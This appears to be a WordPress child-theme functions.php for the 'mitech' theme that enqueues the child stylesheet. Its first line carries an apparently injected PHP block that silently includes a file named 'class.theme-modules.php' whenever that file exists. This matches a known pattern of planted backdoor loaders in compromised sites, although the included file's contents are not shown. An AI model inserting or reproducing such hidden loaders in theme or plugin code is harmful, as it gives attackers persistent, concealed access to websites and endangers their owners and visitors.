<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
defined( 'ABSPATH' ) || exit;

/**
 * Enqueue child scripts
 */
if ( ! function_exists( 'mitech_child_enqueue_scripts' ) ) {
	function mitech_child_enqueue_scripts() {
		wp_enqueue_style( 'mitech-child-style', get_stylesheet_directory_uri() . '/style.css' );
	}
}
add_action( 'wp_enqueue_scripts', 'mitech_child_enqueue_scripts', 15 );
